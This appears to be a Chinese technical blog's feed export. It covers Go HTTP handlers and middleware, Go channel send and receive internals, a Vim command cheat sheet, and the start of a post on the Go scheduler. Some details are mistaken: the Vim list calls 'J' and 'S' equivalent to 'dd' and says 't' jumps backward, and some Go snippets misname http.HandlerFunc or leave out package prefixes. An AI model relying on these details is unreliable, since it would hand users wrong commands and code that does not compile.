<h2 id="注册处理器"><a href="#注册处理器" class="headerlink" title="注册处理器"></a>注册处理器</h2><p>Server 根据请求选择合适的处理器构建响应，那么当然事先要在 Server 中把 请求-处理器 之间的关系注册好，<code>ServerMux</code> 就是负责关系请求模式串和处理器之间的关系的。</p>
<p>注册一个处理器的常用方法就是调用 <code>http.HandleFunc(pattern string, handler func(ResponseWriter, *Request))</code>，其背后的逻辑如下：</p>
<p><img src="https://i.loli.net/2020/06/03/rvLk8VzcFeJyXNw.png" alt="构建处理函数"></p>
<p><code>http.HandleFunc(pattern string, handler func(ResponseWriter, *Request))</code> 会使用 DefaultServeMux 的 <code>HandleFunc</code> 方法，该方法把 handler 处理器函数包装为 handler 处理器，然后通过 DefaultServeMux 的 <code>Handle</code> 方法把这个处理器注册到相应模式串去。这样就完成了一次 <code>模式串-处理器</code> 的注册。</p>
<p>当然，我们也可以创建一个 ServeMux 实例并调用其 <code>HandleFunc</code> 方法把处理器注册到自定义的 ServeMux 上去：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> hiHandler <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *hiHandler)</span> <span class="title">ServeHTTP</span><span class="params">(w http.ResponseWriter,  r *http.Request)</span></span> &#123;</span><br><span class="line">    fmt.Fprint(w, <span class="string">&quot;hi, world!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mux := http.NewServeMux()</span><br><span class="line">    mux.HandleFunc(<span class="string">&quot;/hello&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprint(w, <span class="string">&quot;hello world!&quot;</span>)</span><br><span class="line">    &#125;) <span class="comment">// ServeMux.HandleFunc 需要一个 handler 处理器函数</span></span><br><span class="line">    mux.Handle(<span class="string">&quot;/bye&quot;</span>, http.HandleFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprint(w, <span class="string">&quot;bye world!&quot;</span>)</span><br><span class="line">    &#125;)) <span class="comment">// 把一个 handler 处理器函数包装成一个 handler 处理器</span></span><br><span class="line">    mux.Handle(<span class="string">&quot;/hi&quot;</span>, &amp;hiHandler&#123;&#125;) <span class="comment">// 直接给一个 handler 对象</span></span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, mux) <span class="comment">// 指定 DefaultServer 使用自定义的 ServeMux</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="处理请求"><a href="#处理请求" class="headerlink" title="处理请求"></a>处理请求</h2><p>我们需要一个 Server 对各种请求进行总处理，调用 <code>http.ListenAndServe(string, Handler)</code> 会初始化一个 Server 实例，其背后逻辑如下：</p>
<p><img src="https://i.loli.net/2020/06/04/TiXUv2jkazD1HYN.png" alt="处理请求"></p>
<p>Server 会监听其 <code>Addr</code> 属性上的 TCP 连接，为每个到来的 TCP 连接创建一个 <code>http.conn</code> 作为其在服务器端的抽象。从 <code>http.conn</code> 中读取并解析 HTTP 请求，创建 <code>http.ResponseWriter</code> 作为该请求的响应的抽象，然后在 Server 的 <code>Handler</code> 字段中寻找是否指定了 ServerMux（字段为空则使用 DefaultServeMux）。最后在 ServeMux 中查找并调用相应的处理器构建 HTTP 响应。</p>
<p>Serer 当然也是可以自定义的：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mux := NewServeMux()</span><br><span class="line">    mux.HandleFunc(<span class="string">&quot;/hello&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprint(w, <span class="string">&quot;hello world!&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    server := &amp;http.Server&#123; <span class="comment">// 自定义 Server 的各种属性</span></span><br><span class="line">        Handler: mux,</span><br><span class="line">        Addr: <span class="string">&quot;:8086&quot;</span>,</span><br><span class="line">        ReadTimeout: <span class="number">1</span> * time.Second,</span><br><span class="line">        WriteTimeout: <span class="number">2</span> * time.Second,</span><br><span class="line">    &#125;</span><br><span class="line">    server.ListenAndServe()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="搞搞中间件"><a href="#搞搞中间件" class="headerlink" title="搞搞中间件"></a>搞搞中间件</h2><p>既然 handler 处理器负责对请求构建响应，而函数在 go 中又是所谓“一等公民”（可以被赋值与返回），那么我们可以对它做点文章。比如在一个处理器之外再包一层逻辑形成一个有额外行为的新处理器。</p>
<p>例如，只要我们实现了签名为 <code>func(Handler) Handler</code> 的函数，就可以额外实现一层逻辑，比如打印响应到来的时间：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    hello := <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprint(w, <span class="string">&quot;hello world!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    timeLog := <span class="function"><span class="keyword">func</span><span class="params">(next http.Handler)</span> <span class="title">http</span>.<span class="title">Handler</span></span> &#123;</span><br><span class="line">        <span class="comment">// 构建一个新的处理器，里面包含原处理器</span></span><br><span class="line">        <span class="keyword">return</span> http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(writer http.ResponseWriter, request *http.Request)</span></span> &#123;</span><br><span class="line">            log.Printf( <span class="string">&quot;handling the request at: %v&quot;</span>,  time.Now())</span><br><span class="line">            next.ServeHTTP(writer, request)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    http.Handle(<span class="string">&quot;/hello&quot;</span>, timeLog(http.HandlerFunc(hello)))</span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>Go底层大冒险之channel</title>
    <url>/2020/06/01/channel-Go%E7%9A%84%E4%BC%A0%E5%A3%B0%E7%AD%92/</url>
    <content><![CDATA[<p>得益于 goroutine 的设计，Go 在执行并发任务是可谓是得心应手。既然存在并发，就必然牵扯到多任务同步的问题。当然，我们可以直接用共享内存来通信（如共享变量），但是 Go 的设计哲学中有一句话叫做<code>不要用共享内存来通信，而是用通信共享内存</code>。利用内置的 channel 结构体在多个 goroutine 间通信是更安全也是更被推崇的。</p>
<span id="more"></span>

<p>channel 在 runtime 中用 <code>hchan</code>  结构体表示，每次创建 channel 都是创建了一个这样的结构体:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> hchan <span class="keyword">struct</span> &#123;</span><br><span class="line">    qcount   <span class="keyword">uint</span> <span class="comment">// channel 中元素个数</span></span><br><span class="line">    dataqsiz <span class="keyword">uint</span> <span class="comment">// channel 中循环队列长度</span></span><br><span class="line">    buf      unsafe.Pointer <span class="comment">// channel 的缓冲区数据指针</span></span><br><span class="line">    elemsize <span class="keyword">uint16</span> <span class="comment">// channel 能收发的元素大小</span></span><br><span class="line">    closed   <span class="keyword">uint32</span></span><br><span class="line">    elemtype *_type <span class="comment">// channel 能够收发的元素类型</span></span><br><span class="line">    sendx    <span class="keyword">uint</span> <span class="comment">// 缓冲过区中 channel 的发送操作处理到的位置</span></span><br><span class="line">    recvx    <span class="keyword">uint</span> <span class="comment">// 缓冲区中 channel 的接收操作处理到的位置</span></span><br><span class="line">    recvq    waitq <span class="comment">// 阻塞在这个 hchan 上的接收 goroutine 队列</span></span><br><span class="line">    sendq    waitq <span class="comment">// 阻塞在这个 hchan 上的发送 goroutine 队列</span></span><br><span class="line"></span><br><span class="line">    lock mutex <span class="comment">// 解决可能的线程竞争问题，也就是说 channel 是线程安全的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> waitq <span class="keyword">struct</span> &#123;</span><br><span class="line">    first *sudog</span><br><span class="line">    last  *sudog</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> sudog <span class="keyword">struct</span> &#123;</span><br><span class="line">    g *g</span><br><span class="line">    next     *sudog <span class="comment">// 下一个 sudog</span></span><br><span class="line">    prev     *sudog <span class="comment">// 上一个 sudong</span></span><br><span class="line">    elem     unsafe.Pointer <span class="comment">// 指向数据</span></span><br><span class="line">    c        *hchan <span class="comment">// 属于哪个 channel</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="向-Channel-发送"><a href="#向-Channel-发送" class="headerlink" title="向 Channel 发送"></a>向 Channel 发送</h2><p>函数 <code>runtime.chansend</code> 负责向 channel 发送数据的全部逻辑：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chansend</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>, callerpc <span class="keyword">uintptr</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    lock(&amp;c.lock)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> c.closed != <span class="number">0</span> &#123;</span><br><span class="line">        unlock(&amp;c.lock)</span><br><span class="line">        <span class="built_in">panic</span>(plainError(<span class="string">&quot;send on closed channel&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>在发送数据的逻辑执行之前会先为当前 Channel 加锁，防止发生竞争条件。如果 Channel 已经关闭，那么向该 Channel 发送数据时就会报”send on closed channel” 错误并中止程序。整个函数的执行过程可分为三部分：</p>
<ol>
<li>存在等待的接收者时，把数据直接发送给阻塞的接收者</li>
<li>存在可用缓冲区时，把数据写入缓冲区</li>
<li>不存在缓冲区或缓冲区已满时，等待其它 goroutine 从该 channel 接收数据</li>
</ol>
<h3 id="直接发送"><a href="#直接发送" class="headerlink" title="直接发送"></a>直接发送</h3><p>如果目标 Channel 没有被关闭并且已经有处于读等待的 Goroutine，那么 runtime.chansend 函数会从接收队列 recvq 中取出最先陷入等待的 Goroutine 并直接向它发送数据:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chansend</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>, callerpc <span class="keyword">uintptr</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> sg := c.recvq.dequeue(); sg != <span class="literal">nil</span> &#123;</span><br><span class="line">        send(c, sg, ep, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; unlock(&amp;c.lock) &#125;, <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发送数据时调用 <code>runtime.send</code> 函数，该函数的执行可以分成两个部分：</p>
<ol>
<li>将发送的数据直接拷贝到 x = &lt;-c 表达式中变量 x 所在的内存地址上</li>
<li>将等待接收数据的 Goroutine 标记成可运行状态 Grunnable 并把该 Goroutine 放到发送方所在的处理器的 runnext 上等待执行</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">send</span><span class="params">(c *hchan, sg *sudog, ep unsafe.Pointer, unlockf <span class="keyword">func</span>()</span>, <span class="title">skip</span> <span class="title">int</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> sg.elem != <span class="literal">nil</span> &#123;</span><br><span class="line">        sendDirect(c.elemtype, sg, ep) <span class="comment">// 直接把数据拷贝到接收 goroutine 对应变量的内存地址</span></span><br><span class="line">        sg.elem = <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">    gp := sg.g</span><br><span class="line">    unlock()</span><br><span class="line">    gp.param = unsafe.Pointer(sg)</span><br><span class="line">    goready(gp, skip+<span class="number">1</span>) <span class="comment">// 改变接收 goroutine 的状态，放入处理器 runnext 属性</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="发送到缓冲区"><a href="#发送到缓冲区" class="headerlink" title="发送到缓冲区"></a>发送到缓冲区</h3><p>如果创建的 Channel 包含缓冲区并且 channel 中的数据没有装满，chansend 就会执行下面这段代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chansend</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>, callerpc <span class="keyword">uintptr</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> c.qcount &lt; c.dataqsiz &#123;</span><br><span class="line">        qp := chanbuf(c, c.sendx) <span class="comment">// 计算出缓冲区下一个可用位置</span></span><br><span class="line">        typedmemmove(c.elemtype, qp, ep) <span class="comment">// 发送数据到缓冲区</span></span><br><span class="line">        c.sendx++ <span class="comment">// 更新缓冲区指针</span></span><br><span class="line">        <span class="keyword">if</span> c.sendx == c.dataqsiz &#123;</span><br><span class="line">            c.sendx = <span class="number">0</span> <span class="comment">// 缓冲区是一个循环队列，如果满了就指向队头</span></span><br><span class="line">        &#125;</span><br><span class="line">        c.qcount++ <span class="comment">// 更新缓冲区计数</span></span><br><span class="line">        unlock(&amp;c.lock)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="阻塞发送"><a href="#阻塞发送" class="headerlink" title="阻塞发送"></a>阻塞发送</h3><p>如果 channel 上没有等待接收的 goroutine 或缓冲区不可用，当前发送数据的 goroutine 会被阻塞并加入 channel 的发送队列。chansend 会执行下面的代码:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chansend</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>, callerpc <span class="keyword">uintptr</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> !block &#123;</span><br><span class="line">        unlock(&amp;c.lock)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    gp := getg() <span class="comment">// 获得当前尝试向 channel 发送数据的 Goroutine</span></span><br><span class="line">    mysg := acquireSudog() <span class="comment">// 获取一个 sudog 结构体并设置相关的属性</span></span><br><span class="line">    mysg.elem = ep</span><br><span class="line">    mysg.g = gp</span><br><span class="line">    mysg.c = c</span><br><span class="line">    gp.waiting = mysg <span class="comment">// 表示当前 Goroutine 等待在 sudog 上</span></span><br><span class="line">    c.sendq.enqueue(mysg) <span class="comment">// 将准备好的 sudog 加入 channel 的发送队列</span></span><br><span class="line">    goparkunlock(&amp;c.lock, waitReasonChanSend, traceEvGoBlockSend, <span class="number">3</span>) <span class="comment">// 将当前 Goroutine 陷入沉睡并等待唤醒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 做一些清空属性的收尾工作</span></span><br><span class="line">    gp.waiting = <span class="literal">nil</span></span><br><span class="line">    gp.param = <span class="literal">nil</span></span><br><span class="line">    mysg.c = <span class="literal">nil</span></span><br><span class="line">    releaseSudog(mysg)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>使用 <code>ch &lt;- i</code> 向一个 channel 发送数据时：</p>
<ol>
<li>如果当前 Channel 的 recvq 上存在已经被阻塞的 Goroutine，那么会直接将数据发送给当前的 Goroutine 并将其设置成下一个运行的 Goroutine；</li>
<li>如果 Channel 存在缓冲区并且其中还有空闲的容量，我们就会直接将数据直接存储到当前缓冲区 sendx 所在的位置上；</li>
<li>如果不满足上面的两种情况，就会创建一个 runtime.sudog 结构并将其加入 Channel 的 sendq 队列中，当前 Goroutine 也会陷入阻塞等待其他的协程从 Channel 接收数据</li>
</ol>
<p>发送过程中，2 个时机会触发 Goroutine 调度：</p>
<ol>
<li>发送数据时发现 channel 上存在等待接收数据的 Goroutine，立刻设置处理器的 runnext 属性，但是并不会立刻触发调度</li>
<li>发送数据时并没有找到接收方并且缓冲区已经满了，这时就会将自己加入 Channel 的 sendq 队列并调用 runtime.goparkunlock 触发 Goroutine 的调度让出处理器的使用权</li>
</ol>
<h2 id="从-Channel-接收"><a href="#从-Channel-接收" class="headerlink" title="从 Channel 接收"></a>从 Channel 接收</h2><p>使用 <code>i &lt;- ch</code> 或 <code>i, ok &lt;- ch</code> 都可以从 channel 接收数据，不同方法在 runtime 最后都是调用 <code>runtime.chanrecv</code> 方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">chanrecv</span><span class="params">(c *hchan, ep unsafe.Pointer, block <span class="keyword">bool</span>)</span> <span class="params">(selected, received <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> c == <span class="literal">nil</span> &#123; <span class="comment">// channel 为空（未创建对象）</span></span><br><span class="line">        <span class="keyword">if</span> !block &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 挂起当前 goroutien</span></span><br><span class="line">        gopark(<span class="literal">nil</span>, <span class="literal">nil</span>, waitReasonChanReceiveNilChan, traceEvGoStop, <span class="number">2</span>)</span><br><span class="line">        throw(<span class="string">&quot;unreachable&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    lock(&amp;c.lock)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> c.closed != <span class="number">0</span> &amp;&amp; c.qcount == <span class="number">0</span> &#123; <span class="comment">// 如果 channel 已经关闭并且缓冲区没有数据，直接返回</span></span><br><span class="line">        unlock(&amp;c.lock)</span><br><span class="line">        <span class="keyword">if</span> ep != <span class="literal">nil</span> &#123;</span><br><span class="line">            typedmemclr(c.elemtype, ep)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="非阻塞接收"><a href="#非阻塞接收" class="headerlink" title="非阻塞接收"></a>非阻塞接收</h3><p>当 Channel 的 sendq 队列中包含处于等待状态的 Goroutine 时，该函数会取出队列头等待的 Goroutine，处理的逻辑和发送时相差无几。</p>
<ul>
<li>如果 channel 不存在缓冲区：将 channel 发送队列 sendq 中 Goroutine 存储的 elem 数据拷贝到目标内存地址中；</li>
<li>如果 channel 存在缓冲区：<ol>
<li>将 recvx 指向的缓冲区的数据拷贝到接收方的内存地址</li>
<li>将发送队列 sendq 头的 sudog 中数据拷贝到缓冲区，释放一个阻塞的发送方<br><img src="https://i.loli.net/2020/05/25/13WoPzZrpjmYEnh.png" alt="存在缓冲区"></li>
</ol>
</li>
</ul>
<p>无论发生哪种情况，运行时都会调用 runtime.goready 函数将当前处理器的 runnext 设置成发送数据的 Goroutine，在调度器下一次调度时将阻塞的发送方唤醒。</p>
<h3 id="阻塞接收"><a href="#阻塞接收" class="headerlink" title="阻塞接收"></a>阻塞接收</h3><p>当 channel 的发送队列中不存在等待的 Goroutine 并且缓冲区中也不存在任何数据时，从管道中接收数据的操作会变成阻塞操作。当前请求接收的 Goroutine 会被包装成一个 sudog 放入该 channel 的接收等待队列 recvq，然后触发调度。</p>
<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>从 channel 中接收数据，可能有以下 5 中情况：</p>
<ol>
<li>如果 Channel 为空，那么就会直接调用 runtime.gopark 挂起当前 Goroutine；</li>
<li>如果 Channel 已经关闭并且缓冲区没有任何数据，runtime.chanrecv 函数会直接返回；</li>
<li>如果 Channel 的 sendq 队列中存在挂起的 Goroutine，就会将 recvx 索引所在的数据拷贝到接收变量所在的内存空间上并将 sendq 队列中 Goroutine 的数据拷贝到缓冲区；</li>
<li>如果 Channel 的缓冲区中包含数据就会直接读取 recvx 索引对应的数据；</li>
<li>在默认情况下会挂起当前的 Goroutine，将 runtime.sudog 结构加入 recvq 队列并陷入休眠等待调度器的唤醒；</li>
</ol>
<p>接收过程中，2 个过程会触发 goroutine 调度：</p>
<ol>
<li>channel 为空</li>
<li>缓冲区中不存在数据并且也不存在数据的发送者</li>
</ol>
<h2 id="关闭-channel"><a href="#关闭-channel" class="headerlink" title="关闭 channel"></a>关闭 channel</h2><p>close 一个已被关闭的 channel 会导致 panic。正常情况下，<br>runtime 会清空所有 sudog 上的数据 elem，并把阻塞在这个 channel 上的 goroutine （revq 和 sendq 上的）加入调度队列触发调度。</p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim 从入门到放弃</title>
    <url>/2020/05/22/Vim-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/</url>
    <content><![CDATA[<p>如果问世界上最强大的语言是什么？答案或许有很多，但是如果问世界上最强大的编辑器是什么，恐怕很多人都回答都是 Vim。笔者从入门编程的第一天开始就听说了 Vim 的大名，然而苦于一大堆眼花缭乱的命令，屡屡尝试最后都是无疾而终。最近决心一定要把玩意儿入门了，于是开始跟着官方 tutorial 学习。打开中文版官方 tutorial 命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vimtutor zh</span><br></pre></td></tr></table></figure>

<p>大部分 Vim 命令都可以看作三部分：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">operator [number] motion</span><br></pre></td></tr></table></figure>

<p>operator 是要执行的操作（删除、修改等），number 代表该操作重复的次数，motion 是以什么格式作为操作单位（w 代表单词，$ 代表行末等）</p>
<h2 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h2><p>Vim 使用 h、j、k、l 四个键是光标在左、下、上、右间移动（当然，直接使用光标键也可以）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     ^</span><br><span class="line">     k</span><br><span class="line">&lt;h       l&gt;</span><br><span class="line">     j</span><br><span class="line">     v</span><br></pre></td></tr></table></figure>

<p>光标在行内移动：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#w：从当前位置起移动到下 # 个单词的头部</span><br><span class="line"></span><br><span class="line">#b：#w 的逆操作</span><br><span class="line"></span><br><span class="line">#e：从当前位置其移动到第 # 个单词的尾部</span><br><span class="line"></span><br><span class="line">$：移动到当前行尾部</span><br><span class="line"></span><br><span class="line">0：移动到当前行头部</span><br><span class="line"></span><br><span class="line">fPattern：正向跳转到 Pattern 字符</span><br><span class="line"></span><br><span class="line">tPattern：反向跳转到 Pattern 字符</span><br><span class="line"></span><br><span class="line">%：如果当前位置是 (、)、[、]、&#123;、&#125;，将光标移动到配对的括号上</span><br><span class="line">G：移动到文件末尾</span><br><span class="line"></span><br><span class="line">gg：移动到文件头</span><br><span class="line"></span><br><span class="line">#G：移动到文件的第 # 行</span><br><span class="line"></span><br><span class="line">ctrl+G：显示光标在文件中的位置信息</span><br><span class="line"></span><br><span class="line">ctrl+o：移动到早前光标所在位置（o 表示 older）</span><br><span class="line"></span><br><span class="line">ctrl+i：ctrl+o 的逆操作（i 在 o 的前面）</span><br></pre></td></tr></table></figure>

<p>除了主动移动外，有时需要在文件中根据模式进行搜索：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Pattern：Pattern 表示模式，/ 表示向下搜索</span><br><span class="line"></span><br><span class="line">?Pattern：? 表示向上搜索</span><br><span class="line"></span><br><span class="line">执行搜索操作后，n 表示继续搜索，N 表示反方向搜索</span><br></pre></td></tr></table></figure>

<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>当然可以进入 insert 模式后按下 Backspace 进行删除，这里讨论的是如何在 normal 模式下删除：</p>
<p><code>d</code> 是一个 operator，表示删除（delete）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x： 删除当前光标所在字符</span><br><span class="line">d#w or d#e or d#$ or d#0：d 表示删除操作，w、e、$、0 表示不同操作单位，# 表示重复次数</span><br><span class="line">dd：删除当前行</span><br><span class="line">#dd：删除 # 行</span><br><span class="line">dfPatern：从当前位置删除到 Pattern 字符</span><br><span class="line">di&quot;：删除双引号 &quot;&quot; 里面的内容</span><br><span class="line">da&quot;：删除双引号 &quot;&quot; 及其里面的内容</span><br><span class="line">shift+d：相当于 d$</span><br><span class="line">shift+s：相当于 dd</span><br><span class="line">J：相当于 dd</span><br></pre></td></tr></table></figure>

<p>有修改就有撤销：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">u：撤销上次一命令</span><br><span class="line">U：恢复本行的原始状态（撤销作用在本行的命令）</span><br><span class="line">ctrl+R：u 的逆操作</span><br></pre></td></tr></table></figure>

<h2 id="复制-amp-粘贴"><a href="#复制-amp-粘贴" class="headerlink" title="复制&amp;粘贴"></a>复制&amp;粘贴</h2><p><code>y</code> 是一个 operator，表示复制（copy）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#yy：复制 # 行</span><br><span class="line"></span><br><span class="line">y#w or y#e or y#$ or y#0：y 表示复制操作，w、e、$、0 表示不同操作单位，# 表示重复次数</span><br><span class="line"></span><br><span class="line">v 进入 visual 模式，然后用移动键（h、j、k、l）进行选择</span><br><span class="line">被选中的区域可以进行批量 d、y 操作。</span><br></pre></td></tr></table></figure>


<p>删除操作删掉的数据会保存在 vim 的缓存中，用如下命令把上一次删除的数据复制到相应位置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#p：复制 # 次，如果被删除数据是一整行那么在光标的下一行插入</span><br></pre></td></tr></table></figure>

<h2 id="插入-amp-替换"><a href="#插入-amp-替换" class="headerlink" title="插入&amp;替换"></a>插入&amp;替换</h2><p>在行的指定区域进入 insert 模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A：光标移到行末并进入 insert 模式</span><br><span class="line"></span><br><span class="line">a：在光标后边进入 insert 模式</span><br></pre></td></tr></table></figure>

<p>在 normal 模式下对光标指向的字符进行替换：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rnew：当前字符替换为 new</span><br><span class="line"></span><br><span class="line">Rnew：连续替换多个字符，类似于原地直接修改</span><br></pre></td></tr></table></figure>

<p>如果单个字符修改不够用，可以一次修改更多。<code>c</code> 是一个 operator，表示修改（change）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c#w or c#e or c#$ or c#0：改变从当前位置到指定位置的所有文本，会自动进入 insert 模式</span><br></pre></td></tr></table></figure>

<p>对文本中符合模式的字符串进行替换：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:s/old/new&lt;回车&gt; 替换当前行第一个匹配项 </span><br><span class="line"></span><br><span class="line">:s/old/new/g 替换当前行所有匹配项 </span><br><span class="line"></span><br><span class="line">:#,#s/old/new/g 替换 # 到 # 行所有的匹配项</span><br><span class="line"></span><br><span class="line">:%s/old/new/g 替换文本中每个匹配项</span><br><span class="line"></span><br><span class="line">:%s/old/new/gc 文本中每个匹配项都提示是否进行替换</span><br></pre></td></tr></table></figure>

<p>插入空行并进入 insert 模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">o：在下一行插入空行</span><br><span class="line"></span><br><span class="line">O：在上一行插入空行</span><br></pre></td></tr></table></figure>

<h2 id="保存操作"><a href="#保存操作" class="headerlink" title="保存操作"></a>保存操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:!command：执行 command，即使有命令行参数也可以这么操作</span><br><span class="line"></span><br><span class="line">:w FILENAME 把文件另存为 FILEMNAME</span><br><span class="line"></span><br><span class="line">v 进入 visual 模式，选择相应文本后用 :w FILENAME 把选择的文本另存为 FILENAME</span><br><span class="line"></span><br><span class="line">:r FILENAME 把文件 FILENAME 内容插入到光标之后</span><br><span class="line"></span><br><span class="line">:r !command 把 command 的输出插入到光标之后</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>Go底层大冒险之调度器</title>
    <url>/2020/04/27/%E8%B0%83%E5%BA%A6%E5%99%A8%E2%80%94Go%E8%AF%AD%E8%A8%80%E7%9A%84%E5%A4%A7%E7%AE%A1%E5%AE%B6/</url>
    <content><![CDATA[<p>虽然线程比较轻量，但是在调度时也有比较大的额外开销。每个线程会都占用 1M 以上的内存空间，在对线程进行切换时不止会消耗较多的内存，恢复寄存器中的内容还需要向操作系统申请或者销毁对应的资源，每一次线程上下文的切换都需要消耗 1us 左右的时间。而 Go 调度器对 Goroutine 的上下文切换约为 0.2us，减少了 80% 的额外开销</p>
